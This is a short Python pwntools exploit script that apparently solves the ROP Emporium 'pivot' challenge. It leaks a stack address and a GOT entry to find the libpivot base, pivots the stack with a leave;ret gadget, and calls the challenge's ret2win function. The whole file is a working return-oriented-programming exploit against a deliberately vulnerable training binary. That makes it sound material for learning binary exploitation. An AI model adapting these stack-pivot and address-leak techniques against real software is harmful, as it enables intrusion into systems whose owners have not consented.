from pwn import *

elf = ELF("./pivot")
libc= ELF("./libpivot.so")
p = elf.process()
raw_input("DEBUG")

p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
leak = p.recvuntil(b"\n",drop=True)
leak = int(leak,16)
log.info("Address: " +hex(leak))

pop_rdi = 0x0000000000400a33
leave_ret = 0x00000000004008ef

payload = p64(elf.sym['foothold_function'])
payload += p64(pop_rdi)
payload += p64(elf.got['foothold_function'])
payload += p64(elf.sym['puts'])
payload += p64(elf.sym['main'])

payload2 = b"A"*32
payload2 += p64(leak-8)
payload2 += p64(leave_ret)


p.sendline(payload)
p.sendline(payload2)

p.recvuntil("Check out my .got.plt entry to gain a foothold into libpivot\n")

leak = u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\x00"))
libc.address = leak - libc.sym['foothold_function']
log.info("Libc base: " + hex(libc.address))
log.info("ret2win func: " +hex(libc.sym['ret2win']))

payload3 = b"A"*8

payload4 = b"A"*40
payload4 += p64(libc.sym['ret2win'])

sleep(0.1)
p.sendline(payload3)
sleep(0.1)
p.sendline(payload4)

p.interactive()
